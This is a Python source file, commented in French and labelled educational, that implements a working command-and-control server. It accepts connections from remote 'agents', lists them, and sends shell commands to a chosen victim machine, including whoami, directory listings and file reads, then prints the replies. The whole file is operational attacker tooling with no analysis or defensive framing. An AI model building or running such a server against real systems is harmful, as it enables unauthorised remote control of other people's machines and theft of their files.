import socket
import threading
import queue
import time

class C2Server:
    def __init__(self, host='127.0.0.1', port=4444):
        """
        Serveur C2 simple (pédagogique).
        """
        self.host = host
        self.port = port

        self.agents = {}   # {agent_id: socket}
        self.queues = {}   # {agent_id: Queue}

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.lock = threading.Lock()

        self.shortcuts = {
            "whoami": "whoami",
            "listfiles": "ls -la",
            "pwd": "pwd",
            "cat": "cat",
        }

    def start(self):
        """Démarre le serveur et accepte les connexions entrantes."""
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f"[+] Serveur C2 en écoute sur {self.host}:{self.port}")

            threading.Thread(target=self.prompt, daemon=True).start()

            while True:
                client_socket, addr = self.server_socket.accept()
                agent_id = f"{addr[0]}:{addr[1]}"
                self.agents[agent_id] = client_socket
                self.queues[agent_id] = queue.Queue()
                print(f"[+] Nouvel agent connecté : {agent_id}")

                threading.Thread(target=self.handle_client, args=(client_socket, agent_id), daemon=True).start()

        except Exception as e:
            print(f"[!] Erreur : {e}")
            try:
                self.server_socket.close()
            except:
                pass
            print("[!] Serveur fermé.")

    def handle_client(self, client_socket, agent_id):
        """
        Réceptionner les données depuis le client et les mettre dans la queue.
        NOTE: on n'affiche pas directement ici pour éviter les doublons.
        """
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                # Décoder en ignorant les erreurs et pousser dans la queue
                text = data.decode(errors="ignore")
                # On met la chaîne brute (sans affichage direct)
                self.queues[agent_id].put(text)
        except Exception as e:
            print(f"[!] Erreur avec {agent_id}: {e}")
        finally:
            print(f"[-] Agent déconnecté : {agent_id}")
            try:
                client_socket.close()
            except:
                pass
            if agent_id in self.agents:
                del self.agents[agent_id]
            if agent_id in self.queues:
                del self.queues[agent_id]

    def prompt(self):
        """Prompt principal du serveur."""
        while True:
            try:
                cmd = input("C2> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd == "list":
                print("Agents connectés :")
                for agent_id in self.agents:
                    print(f" - {agent_id}")

            elif cmd.startswith("use "):
                _, agent_id = cmd.split(maxsplit=1)
                if agent_id in self.agents:
                    print(f"[+] Vous contrôlez maintenant {agent_id}. Tapez 'exit' pour revenir au menu principal.")
                    self.agent_prompt(agent_id)
                else:
                    print("[!] Agent introuvable")

            elif cmd == "help":
                print("Commandes du prompt principal :")
                print("  list                      -> liste les agents connectés")
                print("  use <agent_id>            -> passe en sous-prompt pour contrôler un agent")
                print("  exit                      -> ferme le serveur proprement")
                print("\nRaccourcis disponibles (dans le sous-prompt) :")
                for k in self.shortcuts:
                    print(f"  {k}")
                print("\nExemples :")
                print("  whoami")
                print("  listfiles        (Linux : 'ls -la')")
                print("  listfiles win    (Windows : 'dir')")
                print("  cat fichier.txt ")
                print("  pwd")
                print("  exit             -> revient au prompt principal")

            elif cmd == "exit":
                print("[!] Fermeture du serveur...")
                for s in list(self.agents.values()):
                    try:
                        s.close()
                    except:
                        pass
                try:
                    self.server_socket.close()
                except:
                    pass
                break

            else:
                print("Commandes disponibles : list, use <agent_id>, help, exit")

    def agent_prompt(self, agent_id):
        """Sous-prompt pour interagir avec un agent spécifique."""
        sock = self.agents.get(agent_id)
        q = self.queues.get(agent_id)

        if not sock or not q:
            print("[!] Socket ou queue manquante pour cet agent.")
            return

        while True:
            try:
                cmd = input(f"{agent_id}> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd.lower() == "exit":
                break
            if not cmd:
                continue

            parts = cmd.split()
            base = parts[0].lower()

            # Construire la commande à envoyer
            if base in self.shortcuts:
                if base == "listfiles" and len(parts) > 1 and parts[1].lower().startswith("win"):
                    cmd_to_send = "dir"
                elif base == "cat" and len(parts) > 1 and parts[1].lower().startswith("win"):
                    # "cat win fichier.txt" -> "type fichier.txt"
                    if len(parts) > 2:
                        cmd_to_send = "type " + " ".join(parts[2:])
                    else:
                        cmd_to_send = "type"
                else:
                    # Par défaut renvoie la commande telle quelle (ex: "cat fichier.txt")
                    cmd_to_send = cmd
            else:
                cmd_to_send = cmd

            # Envoi
            payload = cmd_to_send + "\n"
            try:
                sock.sendall(payload.encode())
            except Exception as e:
                print(f"[!] Erreur en envoyant la commande : {e}")
                break

            # Lecture des réponses : on attend un premier fragment (3s), puis on vide la queue
            collected_parts = []
            try:
                first = q.get(timeout=3.0)
                collected_parts.append(first)
                # puis lire tant qu'il y a des paquets (petit timeout)
                while True:
                    try:
                        part = q.get(timeout=0.2)
                        collected_parts.append(part)
                    except queue.Empty:
                        break
            except queue.Empty:
                # aucune réponse après 3s
                pass

            # Si rien collecté, message informatif
            if not collected_parts:
                print("[!] Aucun retour reçu — soit le client n'a rien envoyé, soit la commande prend du temps.")
                continue

            # Concatène et nettoie les lignes éventuelles d'echo de la commande
            raw = "".join(collected_parts)
            lines = raw.splitlines()

            # Filtrage simple : supprimer la première ligne si elle est exactement la commande envoyée (echo)
            cleaned_lines = []
            cmd_stripped = cmd_to_send.strip()
            for i, line in enumerate(lines):
                if i == 0 and line.strip() == cmd_stripped:
                    # ignorer l'echo
                    continue
                # parfois le client peut renvoyer le prompt ou l'ID ; on ne filtre pas trop agressivement
                cleaned_lines.append(line)

            # Affichage propre
            if cleaned_lines:
                print("\n".join(cleaned_lines))
            else:
                print("[!] Réponse filtrée (probablement echo de la commande).")

if __name__ == "__main__":
    host = input("Entrez l'adresse IP d'écoute (par défaut 127.0.0.1) : ").strip()
    if not host:
        print("[!] Aucune adresse IP fournie. Fermeture du serveur.")
        exit()

    server = C2Server(host=host)
    server.start()
